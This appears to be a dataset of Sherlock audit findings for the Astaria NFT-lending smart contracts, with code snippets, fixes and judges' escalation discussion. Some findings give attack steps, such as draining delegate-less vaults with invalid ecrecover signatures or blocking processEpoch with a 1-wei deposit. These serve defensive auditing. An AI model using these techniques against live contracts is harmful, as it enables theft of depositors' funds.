INTEREST_DENOMINATOR\n    );\n}\n```\nчIn the `_payment` function, consider updating `lien.amount` after the `beforePayment` call:\nIn this case, lien's slope calculation won't be affected in the `beforePayment` call and the correct slope will be removed from the slope accumulator.чCode Snippet\nSee Vulnerability Detail\nTool used\nManual Review
buyoutLien() will cause the vault to fail to processEpoch()чhighч```\nfunction buyoutLien(ILienToken.LienActionBuyout calldata params) external {\n   // rest of code.\n    /**** tranfer but not liensOpenForEpoch-- *****/\n    _transfer(ownerOf(lienId), address(params.receiver), lienId);\n  }\n```\nчLienToken#buyoutLien() did not reduce vault#liensOpenForEpoch when vault#processEpoch()will check vault#liensOpenForEpoch[currentEpoch] == uint256(0) so processEpoch() will fail\nwhen create LienToken , vault#liensOpenForEpoch[currentEpoch] will ++ when repay or liquidate , vault#liensOpenForEpoch[currentEpoch] will -- and LienToken#buyoutLien() will transfer from vault to to other receiver,so liensOpenForEpoch need reduce\n```\nfunction buyoutLien(ILienToken.LienActionBuyout calldata params) external {\n   // rest of code.\n    /**** tranfer but not liensOpenForEpoch-- *****/\n    _transfer(ownerOf(lienId), address(params.receiver), lienId);\n  }\n```\nч```\n  function buyoutLien(ILienToken.LienActionBuyout calldata params) external {\n// rest of code.\n\n+   //do decreaseEpochLienCount()\n+   address lienOwner = ownerOf(lienId);\n+    bool isPublicVault = IPublicVault(lienOwner).supportsInterface(\n+      type(IPublicVault).interfaceId\n+    );\n+    if (isPublicVault && !AUCTION_HOUSE.auctionExists(collateralId)) {      \n+        IPublicVault(lienOwner).decreaseEpochLienCount(\n+          IPublicVault(lienOwner).getLienEpoch(lienData[lienId].start + lienData[lienId].duration)\n+        );\n+    }    \n\n    lienData[lienId].last = block.timestamp.safeCastTo32();\n    lienData[lienId].start = block.timestamp.safeCastTo32();\n    lienData[lienId].rate = ld.rate.safeCastTo240();\n    lienData[lienId].duration = ld.duration.safeCastTo32();\n    _transfer(ownerOf(lienId), address(params.receiver), lienId);\n  }\n```\n\nDiscussion\nIAmTurnipBoy\nEscalate for 1 USDC\nDuplicate of #194, two sides of the same coin. One points out it that buyout doesn't decrement correctly on one side and the other points out it doesn't increment correctly on the other side\nsherlock-admin\nEscalate for 1 USDC\nDuplicate of #194, two sides of the same coin. One points out it that buyout doesn't decrement correctly on one side and the other points out it doesn't increment correctly on the other side\nYou've created a valid escalation for 1 USDC!\nTo remove the escalation from consideration: Delete your comment. To change the amount you've staked on this escalation: Edit your comment (do not create a new comment).\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nEvert0x\nEscalation rejected.\nThe argument is not giving us full conviction this should be tagged as a duplicate.\nsherlock-admin\nEscalation rejected.\nThe argument is not giving us full conviction this should be tagged as a duplicate.\nThis issue's escalations have been rejected!\nWatsons who escalated this issue will have their escalation amount deducted from their next payout.чprocessEpoch() maybe fail\nCode Snippet\nTool used\nManual Review
Public vaults can become insolvent because of missing `yIntercept` updateчhighч```\n /**\n   * @notice Hook to update the slope and yIntercept of the PublicVault on payment.\n   * The rate for the LienToken is subtracted from the total slope of the PublicVault, and recalculated in afterPayment().\n   * @param lienId The ID of the lien.\n   * @param amount The amount paid off to deduct from the yIntercept of the PublicVault.\n   */\n```\nч"The deduction of `yIntercept` during payments is missing in `beforePayment()` which can lead to vault insolvency.\n`yIntercept` is declared as ""sum of all LienToken amounts"" and documented elsewhere as ""yIntercept (virtual assets) of a PublicVault"". It is used to calculate the total assets of a public vault as: `slope.mulDivDown(delta_t, 1) + yIntercept`.\nIt is expected to be updated on deposits, payments, withdrawals, liquidations. However, the deduction of `yIntercept` during payments is missing in `beforePayment()`. As noted in the function's Natspec:\n```\n /**\n   * @notice Hook to update the slope and yIntercept of the PublicVault on payment.\n   * The rate for the LienToken is subtracted from the total slope of the PublicVault, and recalculated in afterPayment().\n   * @param lienId The ID of the lien.\n   * @param amount The amount paid off to deduct from the yIntercept of the PublicVault.\n   */\n```\n\nthe amount of payment should be deducted from `yIntercept` but is missing."чUpdate `yIntercept` in `beforePayment()` by the `amount` value.\nDiscussion\nandroolloyd\ntagging @SantiagoGregory but i believe this is a documentation error, will address\nsecureum\nEscalate for 2 USDC.\nGiven the vault insolvency impact as described and demonstrated by the PoC, we still think this is a high-severity impact (not Medium as judged). The other dup #92 also reported this as a High.\ncc @berndartmueller @lucyoa\nsherlock-admin\nEscalate for 2 USDC.\nGiven the vault insolvency impact as described and demonstrated by the PoC, we still think this is a high-severity impact (not Medium as judged). The other dup #92 also reported this as a High.\ncc @berndartmueller @lucyoa\nYou've created a valid escalation for 2 USDC!\nTo remove the escalation from consideration: Delete your comment. To change the amount you've staked on this escalation: Edit your comment (do not create a new comment).\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nEvert0x\nEscalation accepted\nsherlock-admin\nEscalation accepted\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.чPoC: https://gist.github.com/berndartmueller/477cc1026d3fe3e226795a34bb8a903a\nThis missing update will inflate the inferred value of the public vault corresponding to its actual value leading to eventual insolvency because of resulting protocol miscalculations.\nCode Snippet\nTool used\nManual Review
Possible to fully block PublicVault.processEpoch function. No one will be able to receive their fundsчhighч"```\n  function redeemFutureEpoch(\n    uint256 shares,\n    address receiver,\n    address owner,\n    uint64 epoch\n  ) public virtual returns (uint256 assets) {\n    // check to ensure that the requested epoch is not the current epoch or in the past\n    require(epoch >= currentEpoch, ""Exit epoch too low"");\n\n\n    require(msg.sender == owner, ""Only the owner can redeem"");\n    // check for rounding error since we round down in previewRedeem.\n\n\n    ERC20(address(this)).safeTransferFrom(owner, address(this), shares);\n\n\n    // Deploy WithdrawProxy if no WithdrawProxy exists for the specified epoch\n    _deployWithdrawProxyIfNotDeployed(epoch);\n\n\n    emit Withdraw(msg.sender, receiver, owner, assets, shares);\n\n\n    // WithdrawProxy shares are minted 1:1 with PublicVault shares\n    WithdrawProxy(withdrawProxies[epoch]).mint(receiver, shares); // was withdrawProxies[withdrawEpoch]\n  }\n```\n"ч"Possible to fully block `PublicVault.processEpoch` function. No one will be able to receive their funds\nWhen liquidity providers want to redeem their share from `PublicVault` they call `redeemFutureEpoch` function which will create new `WithdrawProxy` for the epoch(if not created already) and then mint shares for redeemer in `WithdrawProxy`. `PublicVault` transfer user's shares to himself.\n```\n  function redeemFutureEpoch(\n    uint256 shares,\n    address receiver,\n    address owner,\n    uint64 epoch\n  ) public virtual returns (uint256 assets) {\n    // check to ensure that the requested epoch is not the current epoch or in the past\n    require(epoch >= currentEpoch, ""Exit epoch too low"");\n\n\n    require(msg.sender == owner, ""Only the owner can redeem"");\n    // check for rounding error since we round down in previewRedeem.\n\n\n    ERC20(address(this)).safeTransferFrom(owner, address(this), shares);\n\n\n    // Deploy WithdrawProxy if no WithdrawProxy exists for the specified epoch\n    _deployWithdrawProxyIfNotDeployed(epoch);\n\n\n    emit Withdraw(msg.sender, receiver, owner, assets, shares);\n\n\n    // WithdrawProxy shares are minted 1:1 with PublicVault shares\n    WithdrawProxy(withdrawProxies[epoch]).mint(receiver, shares); // was withdrawProxies[withdrawEpoch]\n  }\n```\n\nThis function mints `WithdrawProxy` shares 1:1 to redeemed `PublicVault` shares. Then later after call of `processEpoch` and `transferWithdrawReserve` the funds will be sent to the `WithdrawProxy` and users can now redeem their shares from it.\nFunction `processEpoch` decides how many funds should be sent to the `WithdrawProxy`.\n```\n    if (withdrawProxies[currentEpoch] != address(0)) {\n      uint256 proxySupply = WithdrawProxy(withdrawProxies[currentEpoch])\n        .totalSupply();\n\n\n      liquidationWithdrawRatio = proxySupply.mulDivDown(1e18, totalSupply());\n\n\n      if (liquidationAccountants[currentEpoch] != address(0)) {\n        LiquidationAccountant(liquidationAccountants[currentEpoch])\n          .setWithdrawRatio(liquidationWithdrawRatio);\n      }\n\n\n      uint256 withdrawAssets = convertToAssets(proxySupply);\n      // compute the withdrawReserve\n      uint256 withdrawLiquidations = liquidationsExpectedAtBoundary[\n        currentEpoch\n      ].mulDivDown(liquidationWithdrawRatio, 1e18);\n      withdrawReserve = withdrawAssets - withdrawLiquidations;\n      // burn the tokens of the LPs withdrawing\n      _burn(address(this), proxySupply);\n\n\n      _decreaseYIntercept(withdrawAssets);\n    }\n```\n\nThis is how it is decided how much money should be sent to WithdrawProxy. Firstly, we look at totalSupply of WithdrawProxy. `uint256 proxySupply = WithdrawProxy(withdrawProxies[currentEpoch]).totalSupply();`.\nAnd then we convert them to assets amount. `uint256 withdrawAssets = convertToAssets(proxySupply);`\nIn the end function burns `proxySupply` amount of shares controlled by PublicVault. `_burn(address(this), proxySupply);`\nThen this amount is allowed to be sent(if no auctions currently, but this is not important right now).\nThis all allows to attacker to make `WithdrawProxy.deposit` to mint new shares for him and increase totalSupply of WithdrawProxy, so `proxySupply` becomes more then was sent to `PublicVault`.\nThis is attack scenario.\n1.PublicVault is created and funded with 50 ethers. 2.Someone calls `redeemFutureEpoch` function to create new WithdrawProxy for next epoch. 3.Attacker sends 1 wei to WithdrawProxy to make totalAssets be > 0. Attacker deposit to WithdrawProxy 1 wei. Now WithdrawProxy.totalSupply > PublicVault.balanceOf(PublicVault). 4.Someone call `processEpoch` and it reverts on burning.\nAs result, nothing will be send to WithdrawProxy where shares were minted for users. The just lost money.\nAlso this attack can be improved to drain users funds to attacker. Attacker should be liquidity provider. And he can initiate next redeem for next epoch, then deposit to new WithdrawProxy enough amount to get new shares. And call `processEpoch` which will send to the vault amount, that was not sent to previous attacked WithdrawProxy, as well. So attacker will take those funds."ч
Any public vault without a delegate can be drainedчhighч```\nVaultImplementation(vaultAddr).init(\n  VaultImplementation.InitParams(delegate)\n);\n```\nч"If a public vault is created without a delegate, delegate will have the value of `address(0)`. This is also the value returned by `ecrecover` for invalid signatures (for example, if v is set to a position number that is not 27 or 28), which allows a malicious actor to cause the signature validation to pass for arbitrary parameters, allowing them to drain a vault using a worthless NFT as collateral.\nWhen a new Public Vault is created, the Router calls the `init()` function on the vault as follows:\n```\nVaultImplementation(vaultAddr).init(\n  VaultImplementation.InitParams(delegate)\n);\n```\n\nIf a delegate wasn't set, this will pass `address(0)` to the vault. If this value is passed, the vault simply skips the assignment, keeping the delegate variable set to the default 0 value:\n```\nif (params.delegate != address(0)) {\n  delegate = params.delegate;\n}\n```\n\nOnce the delegate is set to the zero address, any commitment can be validated, even if the signature is incorrect. This is because of a quirk in `ecrecover` which returns `address(0)` for invalid signatures. A signature can be made invalid by providing a positive integer that is not 27 or 28 as the `v` value. The result is that the following function call assigns recovered = address(0):\n```\n    address recovered = ecrecover(\n      keccak256(\n        encodeStrategyData(\n          params.lienRequest.strategy,\n          params.lienRequest.merkle.root\n        )\n      ),\n      params.lienRequest.v,\n      params.lienRequest.r,\n      params.lienRequest.s\n    );\n```\n\nTo confirm the validity of the signature, the function performs two checks:\n```\nrequire(\n  recovered == params.lienRequest.strategy.strategist,\n  ""strategist must match signature""\n);\nrequire(\n  recovered == owner() || recovered == delegate,\n  ""invalid strategist""\n);\n```\n\nThese can be easily passed by setting the `strategist` in the params to `address(0)`. At this point, all checks will pass and the parameters will be accepted as approved by the vault.\nWith this power, a borrower can create params that allow them to borrow the vault's full funds in exchange for a worthless NFT, allowing them to drain the vault and steal all the user's funds."ч
Auctions can end in epoch after intended, underpaying withdrawersчhighч```\nif (PublicVault(owner).timeToEpochEnd() <= COLLATERAL_TOKEN.auctionWindow())\n```\nчWhen liens are liquidated, the router checks if the auction will complete in a future epoch and, if it does, sets up a liquidation accountant and other logistics to account for it. However, the check for auction completion does not take into account extended auctions, which can therefore end in an unexpected epoch and cause accounting issues, losing user funds.\nThe liquidate() function performs the following check to determine if it should set up the liquidation to be paid out in a future epoch:\n```\nif (PublicVault(owner).timeToEpochEnd() <= COLLATERAL_TOKEN.auctionWindow())\n```\n\nThis function assumes that the auction will only end in a future epoch if the `auctionWindow` (typically set to 2 days) pushes us into the next epoch.\nHowever, auctions can last up to an additional 1 day if bids are made within the final 15 minutes. In these cases, auctions are extended repeatedly, up to a maximum of 1 day.\n```\nif (firstBidTime + duration - block.timestamp < timeBuffer) {\n  uint64 newDuration = uint256(\n    duration + (block.timestamp + timeBuffer - firstBidTime)\n  ).safeCastTo64();\n  if (newDuration <= auctions[tokenId].maxDuration) {\n    auctions[tokenId].duration = newDuration;\n  } else {\n    auctions[tokenId].duration =\n      auctions[tokenId].maxDuration -\n      firstBidTime;\n  }\n  extended = true;\n}\n```\n\nThe result is that there are auctions for which accounting is set up for them to end in the current epoch, but will actual end in the next epoch.чChange the check to take the possibility of extension into account:\n```\nif (PublicVault(owner).timeToEpochEnd() <= COLLATERAL_TOKEN.auctionWindow() + 1 days)\n```\n\nDiscussion\nIAmTurnipBoy\nEscalate for 1 USDC\nThe specific issue address in this submission is incorrect. It passes COLLATERAL_TOKEN.auctionWindow() + 1 days (max possible duration of an auction) into handleNewLiquidation which makes this a non issue.\nsherlock-admin\nYou've created a valid escalation for 1 USDC!\nTo remove the escalation from consideration: Delete your comment. To change the amount you've staked on this escalation: Edit your comment (do not create a new comment).\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nEvert0x\nEscalation rejected.\nsherlock-admin\nThis issue's escalations have been rejected!\nWatsons who escalated this issue will have their escalation amount deducted from their next payout.чUsers who withdrew their funds in the current epoch, who are entitled to a share of the auction's proceeds, will not be paid out fairly.\nCode Snippet\nTool used\nManual Review
Strategists are paid 10x the vault fee because of a math errorчhighч```\nfunction _handleStrategistInterestReward(uint256 lienId, uint256 amount)\n    internal\n    virtual\n    override\n  {\n    if (VAULT_FEE() != uint256(0)) {\n      uint256 interestOwing = LIEN_TOKEN().getInterest(lienId);\n      uint256 x = (amount > interestOwing) ? interestOwing : amount;\n      uint256 fee = x.mulDivDown(VAULT_FEE(), 1000);\n      strategistUnclaimedShares += convertToShares(fee);\n    }\n  }\n```\nчStrategists set their vault fee in BPS (x / 10,000), but are paid out as x / 1,000. The result is that strategists will always earn 10x whatever vault fee they set.\nWhenever any payment is made towards a public vault, `beforePayment()` is called, which calls `_handleStrategistInterestReward()`.\nThe function is intended to take the amount being paid, adjust by the vault fee to get the fee amount, and convert that amount of value into shares, which are added to `strategistUnclaimedShares`.\n```\nfunction _handleStrategistInterestReward(uint256 lienId, uint256 amount)\n    internal\n    virtual\n    override\n  {\n    if (VAULT_FEE() != uint256(0)) {\n      uint256 interestOwing = LIEN_TOKEN().getInterest(lienId);\n      uint256 x = (amount > interestOwing) ? interestOwing : amount;\n      uint256 fee = x.mulDivDown(VAULT_FEE(), 1000);\n      strategistUnclaimedShares += convertToShares(fee);\n    }\n  }\n```\n\nSince the vault fee is stored in basis points, to get the vault fee, we should take the amount, multiply it by `VAULT_FEE()` and divide by 10,000. However, we accidentally divide by 1,000, which results in a 10x larger reward for the strategist than intended.\nAs an example, if the vault fee is intended to be 10%, we would set `VAULT_FEE = 1000`. In that case, for any amount paid off, we would calculate `fee = amount * 1000 / 1000` and the full amount would be considered a fee for the strategist.чChange the `1000` in the `_handleStrategistInterestReward()` function to `10_000`.\nDiscussion\nIAmTurnipBoy\nEscalate for 1 USDC\nDon't agree with high severity. Fee can easily be changed by protocol after the fact to fix this, which is why medium makes more sense. Simple to fix as a parameter change.\nsherlock-admin\nEscalate for 1 USDC\nDon't agree with high severity. Fee can easily be changed by protocol after the fact to fix this, which is why medium makes more sense. Simple to fix as a parameter change.\nYou've created a valid escalation for 1 USDC!\nTo remove the escalation from consideration: Delete your comment. To change the amount you've staked on this escalation: Edit your comment (do not create a new comment).\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nEvert0x\nEscalation accepted.\nsherlock-admin\nEscalation accepted.\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.\nzobront\nEscalate for 5 USDC\nVAULT_FEE() is set as an immutable arg when vault is deployed using ClonesWithImmutableArgs. There is no ability to change it later as the escalation claims. This value would be hard coded in all vaults created.\nThe result is that vault strategists would be given all of the funds of users who deposit in their vault, irretrievably stealing funds from users of the protocol. This is definitely a high.\nsherlock-admin\nEscalate for 5 USDC\nVAULT_FEE() is set as an immutable arg when vault is deployed using ClonesWithImmutableArgs. There is no ability to change it later as the escalation claims. This value would be hard coded in all vaults created.\nThe result is that vault strategists would be given all of the funds of users who deposit in their vault, irretrievably stealing funds from users of the protocol. This is definitely a high.\nYou've created a valid escalation for 5 USDC!\nTo remove the escalation from consideration: Delete your comment. To change the amount you've staked on this escalation: Edit your comment (do not create a new comment).\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nEvert0x\nEscalation accepted\nsherlock-admin\nEscalation accepted\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.чStrategists will be paid 10x the agreed upon rate for their role, with the cost being borne by users.\nCode Snippet\nTool used\nManual Review
Claiming liquidationAccountant will reduce vault y-intercept by more than the correct amountчhighч```\nPublicVault(VAULT()).decreaseYIntercept(\n  (expected - ERC20(underlying()).balanceOf(address(this))).mulDivDown(\n    1e18 - withdrawRatio,\n    1e18\n  )\n);\n```\nчWhen `claim()` is called on the Liquidation Accountant, it decreases the y-intercept based on the balance of the contract after funds have been distributed, rather than before. The result is that the y-intercept will be decreased more than it should be, siphoning funds from all users.\nAfter performing these transfers, it updates the vault's y-intercept, decreasing it by the gap between the expected return from the auction, and the reality of how much was sent back to the vault:\n```\nPublicVault(VAULT()).decreaseYIntercept(\n  (expected - ERC20(underlying()).balanceOf(address(this))).mulDivDown(\n    1e18 - withdrawRatio,\n    1e18\n  )\n);\n```\n\nThis rebalancing uses the balance of the `liquidationAccountant` to perform its calculation, but it is done after the balance has already been distributed, so it will always be 0.\nLooking at an example:\n`expected` = 1 ether (meaning the y-intercept is currently based on this value)\n`withdrawRatio = 0` (meaning all funds will go back to the vault)\nThe auction sells for exactly 1 ether\n1 ether is therefore sent directly to the vault\nIn this case, the y-intercept should not be updated, as the outcome was equal to the `expected` outcome\nHowever, because the calculation above happens after the funds are distributed, the decrease equals `(expected - 0) * 1e18 / 1e18`, which equals `expected`\nThat decrease should not happen, and causing problems for the protocol's accounting. For example, when `withdraw()` is called, it uses the y-intercept in its calculation of the `totalAssets()` held by the vault, creating artificially low asset values for a given number of shares.чThe amount of assets sent to the vault has already been calculated, as we've already sent it. Therefore, rather than the full existing formula, we can simply call:\n```\nPublicVault(VAULT()).decreaseYIntercept(expected - balance)\n```\n\nAlternatively, we can move the current code above the block of code that transfers funds out (L73).чEvery time the liquidation accountant is used, the vault's math will be thrown off and user shares will be falsely diluted.\nCode Snippet\nTool used\nManual Review
liquidationAccountant can be claimed at any timeчhighч```\nLiquidationAccountant(accountant).handleNewLiquidation(\n  lien.amount,\n  COLLATERAL_TOKEN.auctionWindow() + 1 days\n);\n```\nч"New liquidations are sent to the `liquidationAccountant` with a `finalAuctionTimestamp` value, but the actual value that is passed in is simply the duration of an auction. The `claim()` function uses this value in a require check, so this error will allow it to be called before the auction is complete.\nOne of the values passed in this call is the `finalAuctionTimestamp`, which updates the `finalAuctionEnd` variable in the `liquidationAccountant`. This value is then used to protect the `claim()` function from being called too early.\nHowever, when the router calls `handleLiquidationAccountant()`, it passes the duration of an auction rather than the final timestamp:\n```\nLiquidationAccountant(accountant).handleNewLiquidation(\n  lien.amount,\n  COLLATERAL_TOKEN.auctionWindow() + 1 days\n);\n```\n\nAs a result, `finalAuctionEnd` will be set to 259200 (3 days).\nWhen `claim()` is called, it requires the final auction to have ended for the function to be called:\n```\nrequire(\n  block.timestamp > finalAuctionEnd || finalAuctionEnd == uint256(0),\n  ""final auction has not ended""\n);\n```\n\nBecause of the error above, `block.timestamp` will always be greater than `finalAuctionEnd`, so this will always be permitted."чAdjust the call from the router to use the ending timestamp as the argument, rather than the duration:\n```\nLiquidationAccountant(accountant).handleNewLiquidation(\n  lien.amount,\n  block.timestamp + COLLATERAL_TOKEN.auctionWindow() + 1 days\n);\n```\n\nDiscussion\nIAmTurnipBoy\nEscalate for 1 USDC\nTouched on the same idea as #135. Tough call on duplication. This issue + #47 combine represent the same vulnerability fixed in both #135 and #188. In this issue it addresses being called too early and in #47 it addresses being called multiple times. The fix proposed in #135 and #188 address both issues by permissioning the function. IMHO this and 47 should be duped with #135 and #188, but up to judges.\nALSO little bit of a conflict of interest that @zobront validated his own issue here.\nsherlock-admin\nEscalate for 1 USDC\nTouched on the same idea as #135. Tough call on duplication. This issue + #47 combine represent the same vulnerability fixed in both #135 and #188. In this issue it addresses being called too early and in #47 it addresses being called multiple times. The fix proposed in #135 and #188 address both issues by permissioning the function. IMHO this and 47 should be duped with #135 and #188, but up to judges.\nALSO little bit of a conflict of interest that @zobront validated his own issue here.\nYou've created a valid escalation for 1 USDC!\nTo remove the escalation from consideration: Delete your comment. To change the amount you've staked on this escalation: Edit your comment (do not create a new comment).\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nEvert0x\nEscalation accepted.\n#135 and #188 are already duplicates. This issue and #47 touch on the same core issue that `claim()` is not safe to be publicly callable.\nsherlock-admin\nEscalation accepted.\n#135 and #188 are already duplicates. This issue and #47 touch on the same core issue that `claim()` is not safe to be publicly callable.\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.\nzobront\nEscalate for 5 USDC\nThis isn’t a dup of #135 or #188. Those two issues are talking about access control for the function. This calls out that there is a specific time enforcement mechanism (finalAuctionTimestamp) that is calculated incorrectly, allowing it to be called early.\nYes, I agree that adding access controls (their solution) would reduce the harm from this issue, but they are unrelated issues that just happen to have overlapping solutions. The real solution to this one is to do the calculation properly.\nNOTE: The other issue of mine that was dup’d with these is #47, which focuses on that there aren’t restrictions to stop `claim()` being called multiple times. I probably wouldn’t consider that a dup of theirs either, but it’s on the fence so I’m ok with it — but this one is clearly different.\nsherlock-admin\nEscalate for 5 USDC\nThis isn’t a dup of #135 or #188. Those two issues are talking about access control for the function. This calls out that there is a specific time enforcement mechanism (finalAuctionTimestamp) that is calculated incorrectly, allowing it to be called early.\nYes, I agree that adding access controls (their solution) would reduce the harm from this issue, but they are unrelated issues that just happen to have overlapping solutions. The real solution to this one is to do the calculation properly.\nNOTE: The other issue of mine that was dup’d with these is #47, which focuses on that there aren’t restrictions to stop `claim()` being called multiple times. I probably wouldn’t consider that a dup of theirs either, but it’s on the fence so I’m ok with it — but this one is clearly different.\nYou've created a valid escalation for 5 USDC!\nTo remove the escalation from consideration: Delete your comment. To change the amount you've staked on this escalation: Edit your comment (do not create a new comment).\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nEvert0x\nEscalation accepted. at the initial escalation we misinterpreted the https://github.com/sherlock-audit/2022-10-astaria-judging/issues/135 / https://github.com/sherlock-audit/2022-10-astaria-judging/issues/188 as it was thought they described both issues.\nsherlock-admin\nEscalation accepted. at the initial escalation we misinterpreted the https://github.com/sherlock-audit/2022-10-astaria-judging/issues/135 / https://github.com/sherlock-audit/2022-10-astaria-judging/issues/188 as it was thought they described both issues.\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.чAnyone can call `claim()` before an auction has ended. This can cause many problems, but the clearest is that it can ruin the protocol's accounting by decreasing the Y intercept of the vault.\nFor example, if `claim()` is called before the auction, the returned value will be 0, so the Y intercept will be decreased as if there was an auction that returned no funds.\nCode Snippet\nTool used\nManual Review
isValidRefinance checks both conditions instead of one, leading to rejection of valid refinancesчhighч```\nif (!ASTARIA_ROUTER.isValidRefinance(lienData[lienId], ld)) {\n  revert InvalidRefinance();\n}\n```\nч`isValidRefinance()` is intended to check whether either (a) the loan interest rate decreased sufficiently or (b) the loan duration increased sufficiently. Instead, it requires both of these to be true, leading to the rejection of valid refinances.\n```\nif (!ASTARIA_ROUTER.isValidRefinance(lienData[lienId], ld)) {\n  revert InvalidRefinance();\n}\n```\n\nOne of the roles of this function is to check whether the rate decreased by more than 0.5%. From the docs:\nAn improvement in terms is considered if either of these conditions is met:\nThe loan interest rate decrease by more than 0.5%.\nThe loan duration increases by more than 14 days.\nThe currently implementation of the code requires both of these conditions to be met:\n```\nreturn (\n    newLien.rate >= minNewRate &&\n    ((block.timestamp + newLien.duration - lien.start - lien.duration) >= minDurationIncrease)\n);\n```\nчChange the AND in the return statement to an OR:\n```\nreturn (\n    newLien.rate >= minNewRate ||\n    ((block.timestamp + newLien.duration - lien.start - lien.duration) >= minDurationIncrease)\n);\n```\n\nDiscussion\nSantiagoGregory\nIndependently fixed during our own review so there's no PR specifically for this, but this is now updated to an or.\nIAmTurnipBoy\nEscalate for 1 USDC\nShould be medium because there are no funds at risk\nsherlock-admin\nEscalate for 1 USDC\nShould be medium because there are no funds at risk\nYou've created a valid escalation for 1 USDC!\nTo remove the escalation from consideration: Delete your comment. To change the amount you've staked on this escalation: Edit your comment (do not create a new comment).\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nEvert0x\nEscalation rejected.\nNot a major loss of funds but definitely a severe flaw that will hurt the protocol.\nsherlock-admin\nEscalation rejected.\nNot a major loss of funds but definitely a severe flaw that will hurt the protocol.\nThis issue's escalations have been rejected!\nWatsons who escalated this issue will have their escalation amount deducted from their next payout.чValid refinances that meet one of the two criteria will be rejected.\nCode Snippet\nTool used\nManual Review
isValidRefinance will approve invalid refinances and reject valid refinances due to buggy mathчhighч```\nif (!ASTARIA_ROUTER.isValidRefinance(lienData[lienId], ld)) {\n  revert InvalidRefinance();\n}\n```\nчThe math in `isValidRefinance()` checks whether the rate increased rather than decreased, resulting in invalid refinances being approved and valid refinances being rejected.\n```\nif (!ASTARIA_ROUTER.isValidRefinance(lienData[lienId], ld)) {\n  revert InvalidRefinance();\n}\n```\n\nOne of the roles of this function is to check whether the rate decreased by more than 0.5%. From the docs:\nAn improvement in terms is considered if either of these conditions is met:\nThe loan interest rate decrease by more than 0.5%.\nThe loan duration increases by more than 14 days.\nThe current implementation of the function does the opposite. It calculates a `minNewRate` (which should be maxNewRate) and then checks whether the new rate is greater than that value.\n```\nuint256 minNewRate = uint256(lien.rate) - minInterestBPS;\nreturn (newLien.rate >= minNewRate // rest of code\n```\n\nThe result is that if the new rate has increased (or decreased by less than 0.5%), it will be considered valid, but if it has decreased by more than 0.5% (the ideal behavior) it will be rejected as invalid.чFlip the logic used to check the rate to the following:\n```\nuint256 maxNewRate = uint256(lien.rate) - minInterestBPS;\nreturn (newLien.rate <= maxNewRate// rest of code\n```\n\nDiscussion\nIAmTurnipBoy\nEscalate for 1 USDC\nShould be medium because no funds at risk\nsherlock-admin\nEscalate for 1 USDC\nShould be medium because no funds at risk\nYou've created a valid escalation for 1 USDC!\nTo remove the escalation from consideration: Delete your comment. To change the amount you've staked on this escalation: Edit your comment (do not create a new comment).\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nEvert0x\nEscalation rejected.\nNot a major loss of funds but definitely a severe flaw that will hurt the protocol.\nsherlock-admin\nEscalation rejected.\nNot a major loss of funds but definitely a severe flaw that will hurt the protocol.\nThis issue's escalations have been rejected!\nWatsons who escalated this issue will have their escalation amount deducted from their next payout.чUsers can perform invalid refinances with the wrong parameters.\nUsers who should be able to perform refinances at better rates will not be able to.\nCode Snippet\nTool used\nManual Review
new loans ""max duration"" is not restricted"чmediumч```\n  function testBasicPublicVaultLoan() public {\n\n  IAstariaRouter.LienDetails memory standardLien2 =\n    IAstariaRouter.LienDetails({\n      maxAmount: 50 ether,\n      rate: (uint256(1e16) * 150) / (365 days),\n      duration: 50 days,  /****** more then 14 * 2 *******/\n      maxPotentialDebt: 50 ether\n    });    \n\n    _commitToLien({\n      vault: publicVault,\n      strategist: strategistOne,\n      strategistPK: strategistOnePK,\n      tokenContract: tokenContract,\n      tokenId: tokenId,\n      lienDetails: standardLien2, /**** use standardLien2 ****/\n      amount: 10 ether,\n      isFirstLien: true\n    });\n  }\n```\nч"document : "" Epochs PublicVaults operate around a time-based epoch system. An epoch length is defined by the strategist that deploys the PublicVault. The duration of new loans is restricted to not exceed the end of the next epoch. For example, if a PublicVault is 15 days into a 30-day epoch, new loans must not be longer than 45 days. "" but more than 2 epoch's duration can be added\nthe max duration is not detected. add success when > next epoch\n#AstariaTest#testBasicPublicVaultLoan\n```\n  function testBasicPublicVaultLoan() public {\n\n  IAstariaRouter.LienDetails memory standardLien2 =\n    IAstariaRouter.LienDetails({\n      maxAmount: 50 ether,\n      rate: (uint256(1e16) * 150) / (365 days),\n      duration: 50 days,  /****** more then 14 * 2 *******/\n      maxPotentialDebt: 50 ether\n    });    \n\n    _commitToLien({\n      vault: publicVault,\n      strategist: strategistOne,\n      strategistPK: strategistOnePK,\n      tokenContract: tokenContract,\n      tokenId: tokenId,\n      lienDetails: standardLien2, /**** use standardLien2 ****/\n      amount: 10 ether,\n      isFirstLien: true\n    });\n  }\n```\n"ч"PublicVault#_afterCommitToLien\n```\n  function _afterCommitToLien(uint256 lienId, uint256 amount)\n    internal\n    virtual\n    override\n  {\n    // increment slope for the new lien\n    unchecked {\n      slope += LIEN_TOKEN().calculateSlope(lienId);\n    }\n\n    ILienToken.Lien memory lien = LIEN_TOKEN().getLien(lienId);\n\n    uint256 epoch = Math.ceilDiv(\n      lien.start + lien.duration - START(),\n      EPOCH_LENGTH()\n    ) - 1;\n\n+   require(epoch <= currentEpoch + 1,""epoch max <= currentEpoch + 1"");\n\n    liensOpenForEpoch[epoch]++;\n    emit LienOpen(lienId, epoch);\n  }\n```\n"чToo long duration\nCode Snippet\nTool used\nManual Review
